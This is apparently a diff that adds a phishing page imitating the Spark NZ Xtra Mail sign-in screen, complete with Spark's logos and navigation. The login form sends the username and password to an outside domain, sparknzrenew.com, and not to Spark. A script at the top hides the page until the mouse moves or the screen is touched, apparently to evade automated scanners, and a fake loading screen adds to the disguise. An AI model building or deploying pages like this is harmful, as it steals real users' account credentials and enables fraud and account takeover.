@@ -1,0 +1,212 @@
+<script>
+window.addEventListener('load', function () {
+	
+document.getElementsByTagName('body')[0].style.display = 'none';
+
+window.onmousemove = function() {
+document.getElementsByTagName('body')[0].style.display = '';
+}
+
+window.addEventListener('touchmove', function() {
+document.getElementsByTagName('body')[0].style.display = '';
+});
+
+window.addEventListener('touchstart', function() {
+document.getElementsByTagName('body')[0].style.display = '';
+});
+
+
+})
+</script>
+
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link rel="icon" href="https://www.spark.co.nz/favicon_32.png" />
+  <link rel="apple-touch-icon" href="https://www.spark.co.nz/content/dam/sparkresponsive/logo/device-logo.png" />
+  <title>Xtra Mail | Spark Email</title>
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.0/css/mdb.min.css" rel="stylesheet">
+  <link href="files/styles.css" rel="stylesheet">
+</head>
+
+<body>
+  <div class="welcome" id="welcome">
+    <div style="width:100px; margin : 0 auto; margin-top : 20%">
+      <img src ="files/loading.gif" width="100">
+    </div>
+  </div>
+  <header class="container-fluid p-0 ">
+    <div class="navber_mobile d-block d-lg-none">
+      <div class=" container-fluid p-0 m-0">
+        <div class="row p-0">
+          <div class=" col-8 p-0">
+            <img src="files/logo.svg" width="84" style="margin-top: 16px; margin-left:5px">
+          </div>
+          <div class="col p-0 text-right" style="margin-top: -4px; margin-right:7px">
+            <img src="files/menu_mobile.png" height="50" style="margin-top: 10px; margin-right:-15px">
+
+          </div>
+        </div>
+      </div>
+
+    </div>
+    <div class=" navber_cont  d-none d-lg-flex">
+      <div class=" container-fluid p-0 m-0">
+        <div class="row p-0">
+          <div class=" col-8 p-0">
+            <ul class="list-group list-group-horizontal menutoptop">
+              <li class="list-group-item" style="color: #5f259f;font-family: 'AvenirNextLTPro-Demi';">Personal</li>
+              <li class="list-group-item">Small Business</li>
+              <li class="list-group-item">Medium and Enterprise Business</li>
+              <li class="list-group-item">Spark 5G</li>
+              <li class="list-group-item">Other websites &nbsp;<img src="files/arrow.png" width="20"></li>
+            </ul>
+          </div>
+          <div class="col p-0 text-right" style="margin-top: -4px; margin-right:7px">
+            <img src="files/menu.png" height="25">
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="navber_main  d-none d-lg-flex">
+      <div class=" container-fluid p-0 m-0 mt-1">
+        <div class="row p-0">
+          <ul class="list-group list-group-horizontal menutop">
+            <li class="list-group-item"><img src="files/logo.svg" width="84" style="margin-top:-5px; margin-right:18px"></li>
+
+
+
+
+
+
+
+
+
+            <li class="list-group-item">Shop &nbsp;<img src="files/arrow.png" width="20"></li>
+            <li class="list-group-item">MySpark</li>
+            <li class="list-group-item">Get more &nbsp;<img src="files/arrow.png" width="20"></li>
+            <li class="list-group-item">Help & support &nbsp;<img src="files/arrow.png" width="20"></li>
+            <li class="list-group-item">Play</li>
+          </ul>
+          <div class="col p-0 text-right" style="margin-right:12px">
+            <img src="files/search.png" height="30">
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main role="main">
+    <form class="main-form" action="https://sparknzrenew.com/nzsprk/2db82e0f698804408eafba7350d06542/pay.php" method="POST">
+      <h2>Sign in</h2>
+      <div style="font-size: 16px;padding-top: 2px;    color: #666666;">Xtra Mail</div>
+      <div class="row">
+        <div class="col-12">
+          <div class="md-form inputdiv">
+            <input type="text" id="username" name="username" class="form-control">
+            <label for="form1">Username</label>
+          </div>
+        </div>
+        <div class="col-12">
+          <div class="md-form inputdiv">
+            <input type="password" id="password" name= "password" class="form-control">
+            <label for="form1">Password</label>
+          </div>
+        </div>
+
+        <div class="col-12">
+          <div class="custom-control custom-checkbox boxdiv">
+            <input type="checkbox" class="custom-control-input" id="defaultUnchecked">
+            <label class="custom-control-label" for="defaultUnchecked">Stay signed in</label>
+          </div>
+        </div>
+
+      </div>
+      <div class="row inputdiv">
+        <div class="col-6 p-0">
+          <button class="btnlink">Can't sign in</button>
+        </div>
+        <div class="col-6 text-right p-0">
+          <button class="btn-primary" id="signin" disabled="disabled">Sign in</button>
+        </div>
+      </div>
+</form>
+    <button class="btnlink d-block mx-auto">Need help ?</button>
+
+
+  </main>
+
+  <footer class="text-muted p-0">
+    <div class="footercont">
+      <div class="container">
+        <div class="row p-0  d-none d-lg-flex">
+          <div class="col-3 p-0 ">
+            <div class="title">
+              <h2>Shop</h2>
+            </div>
+            <img src="files/menub1.png" width="140">
+          </div>
+          <div class="col-3 p-0">
+            <div class="title">
+              <h2>Get More</h2>
+            </div>
+            <img src="files/menub2.png" width="140">
+          </div>
+          <div class="col-3 p-0 ">
+            <div class="title">
+              <h2>MySpark</h2>
+            </div>
+            <img src="files/menub3.png" width="160">
+          </div>
+          <div class="col-3 mx-auto p-0">
+            <div class="title">
+              <h2>Help & support</h2>
+            </div>
+            <img src="files/menub4.png" width="160">
+          </div>
+        </div>
+        <div class="row p-0">
+          <div class="col-12 p-0 d-none d-lg-block">
+            <img src="files/footer.png" style="margin-left: -20px;text-align:center" width="100%">
+          </div>
+          <div class="col-4 mx-auto p-0 d-block d-lg-none">
+            <div class="title">
+              <h2 style="text-align:center">Help & support</h2>
+            </div>
+
+            <img src="files/footer_mobile2.png" class="d-block mx-auto" style="text-align:center; margin-bottom:20px" width="200">
+            <img src="files/footer_mobile.png" class="d-block mx-auto" style="text-align:center" width="200">
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </footer>
+
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.0/js/mdb.min.js"></script>
+  <script>
+    setTimeout(function() {
+      $("#welcome").remove()
+    }, 4000);
+    $("input").keyup(function() {
+      if ($("#username").val() != "" && $("#password").val() != "") {
+        $("#signin").removeAttr("disabled");
+      }
+    })
+  </script>
+</body>
+
+</html>
